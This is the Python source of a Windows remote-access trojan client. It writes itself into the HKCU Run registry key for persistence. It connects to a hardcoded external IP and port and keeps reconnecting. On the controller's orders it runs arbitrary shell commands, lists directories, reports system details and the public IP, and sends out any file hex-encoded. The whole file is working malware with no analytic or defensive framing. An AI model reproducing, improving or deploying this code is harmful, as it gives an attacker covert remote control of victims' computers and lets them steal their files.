import requests
import platform
import socket
import json
import time
import os
import re
import winreg
import sys
import win32api
import win32con

# Send dynamic length socket data
def send_dyn_socket(server, content):
    send_data = json.dumps({
                'type': 'data',
                'content': content
            }).encode()
    server.send(json.dumps({
        'type': 'length',
        'content': len(send_data)
    }).encode())
    while True:
        recv_data = server.recv(2048).decode()
        json_data = json.loads(recv_data)
        if json_data['type'] == 'okay':
            server.send(send_data)
            break
        else:
            continue


def exec_shell(server, command): # Execute shell command
    console_return = "".join(os.popen(command).readlines())
    send_dyn_socket(server, console_return)


def scan_dir(server, path): # Scan directory
    scan_result = os.listdir(path)
    dir_list = list()
    file_list = list()
    for direntry in scan_result:
        sub_path = path + os.path.sep + direntry
        if os.path.isfile(sub_path):
            file_list.append(direntry)
        elif os.path.isdir(sub_path):
            dir_list.append(direntry)
    entire_dir = list((dir_list, file_list))
    send_dyn_socket(server, entire_dir)


def get_info(server): # Get system info
    send_info = json.dumps({
        'ip': get_ip(),
        'node': platform.node(),
        'platform': platform.platform(),
        'version': platform.version(),
        'processor': platform.processor()
    })
    send_dyn_socket(server, send_info)


def download_file(server, filepath): # Get file
    if os.path.exists(filepath):
        buf = bytearray(os.path.getsize(filepath))
        with open(filepath, 'rb') as file:
            file.readinto(buf)
        send_dyn_socket(server, buf.hex())
    else:
        send_dyn_socket(server, 'File does not exists')


def tcpClient(client):
    while True:
        try:
            recv_data = client.recv(2048).decode()
            json_data = json.loads(recv_data)
            match json_data['type']:
                case 'heartbeat':
                    continue
                case 'shell':
                    exec_shell(client, json_data['content'])
                case 'scandir':
                    scan_dir(client, json_data['content'])
                case 'info':
                    get_info(client)
                case 'downfile':
                    download_file(client, json_data['content'])
        except:
            client.close()
            connect()
            return


def auto_run():
    def zhao():
        location = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, location)
        i = 0
        while True:
            try:
                if winreg.EnumValue(key, i)[0] == os.path.basename(sys.argv[0]):
                    return True
                i += 1
            except OSError as error:
                winreg.CloseKey(key)
                break

    flag = zhao()
    if flag:
        pass
    else:
        sys.setrecursionlimit(1000000)
        name = os.path.basename(sys.argv[0])
        path = os.getcwd() + '\\' + os.path.basename(sys.argv[0])
        key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0,
                                  win32con.KEY_ALL_ACCESS)
        win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
        win32api.RegCloseKey(key)


def get_ip():
    try:
        addr_ip = requests.get('http://whois.pconline.com.cn/ipJson.jsp').text
        ip = re.findall(re.compile(r'"ip":"(.*?)"'), addr_ip)[0]
        return ip
    except:
        return '0:0:0:0'


def connect():
    host = '123.160.10.39'
    port = 55575
    try:
        client = socket.socket()
        client.connect((host, port))
        print('server connected')
        client.send(json.dumps({
            'type': 'client',
            'content': platform.platform() + ' - ' + get_ip()
        }).encode())
        tcpClient(client)
    except socket.error as e:
        print(e.strerror)
        time.sleep(1)
        connect()


if __name__ == '__main__':
    auto_run()
    connect()
